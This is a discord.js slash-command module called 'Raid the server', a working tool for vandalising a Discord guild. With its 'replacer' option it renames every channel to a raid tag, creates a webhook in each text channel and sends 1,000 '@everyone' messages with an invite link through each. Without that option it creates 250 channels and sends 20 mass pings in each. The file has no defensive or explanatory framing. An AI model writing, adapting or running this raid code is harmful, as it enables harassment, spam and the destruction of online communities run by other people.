const { SlashCommandBuilder, BaseInteraction } = require("discord.js");

module.exports = {
  CMD: new SlashCommandBuilder()
    .setDescription("Raid the server")
    .addBooleanOption((option) =>
      option
        .setName("replacer")
        .setDescription(
          "If you turn on this option the bot will replace all channel names and create webhook to raid it"
        )
    ),
  async execute(client, interaction) {
    const { guild, options } = interaction;

    const replacer = options.getBoolean("replacer");

    if (replacer) {
      var textChannels = [];

      guild.channels.cache.map((channel) => {
        channel.setName("RⱥᎥdedBψScψ†heSqบad☂");
        if (channel.isTextBased()) textChannels.push(channel);
      });

      textChannels.map(async (channel) => {
        const webhook = await channel.createWebhook({
          name: "⚆ _ ⚆",
          reason: "⚆ _ ⚆",
        });

        for (let messages = 0; messages < 1000; messages++) {
          webhook.send({
            content: "@everyone https://discord.gg/sfARF56Z5d",
          });
        }
      });

      return;
    }

    for (let newChannels = 0; newChannels < 250; newChannels++) {
        const channel = await guild.channels.create({
            name: "RⱥᎥdedBψScψ†heSqบad☂",
            reason: "⚆ _ ⚆"
        });

        for (let messages = 0; messages < 20; messages++) {
            channel.send("@everyone https://discord.gg/sfARF56Z5d");
        }
    }
  },
};
